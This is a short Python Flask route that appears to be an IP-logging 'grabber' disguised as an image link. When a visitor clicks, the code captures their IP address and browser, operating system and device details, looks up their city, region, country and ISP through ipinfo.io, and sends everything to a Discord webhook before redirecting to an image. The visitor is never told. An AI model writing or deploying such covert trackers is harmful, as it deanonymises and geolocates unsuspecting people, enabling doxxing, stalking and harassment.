from user_agents import parse

@app.route('/track')
def track():
    try:
        ip = request.remote_addr or 'unknown'
        user_agent_string = request.headers.get('User-Agent', 'unknown')
        
        # Parse the user-agent string
        user_agent = parse(user_agent_string)

        # Extract specific details from the parsed user agent
        browser = user_agent.browser.family  # e.g., Chrome, Firefox
        os = user_agent.os.family  # e.g., Windows, macOS
        device = user_agent.device.family  # e.g., Desktop, Mobile

        # Print parsed info to check
        print(f"Browser: {browser}, OS: {os}, Device: {device}")
        
        # Get geo info (use ipinfo.io or any other service)
        geo = requests.get(f"https://ipinfo.io/{ip}/json").json()
        city = geo.get("city", "Unknown")
        region = geo.get("region", "Unknown")
        country = geo.get("country", "Unknown")
        org = geo.get("org", "Unknown")

        # Build message
        content = (
            f"👀 Click detected!\n"
            f"🌍 IP: `{ip}`\n"
            f"📍 Location: {city}, {region}, {country}\n"
            f"🏢 ISP: {org}\n"
            f"🖥️ User-Agent: {browser} on {os} ({device})"
        )

        # Send to Discord
        requests.post(WEBHOOK_URL, json={"content": content})

        # Redirect to your image link
        return redirect("https://your-image-link.com")

    except Exception as e:
        print(f"Error in track function: {str(e)}")
        traceback.print_exc()  # Detailed error in logs
        return "Something went wrong", 500
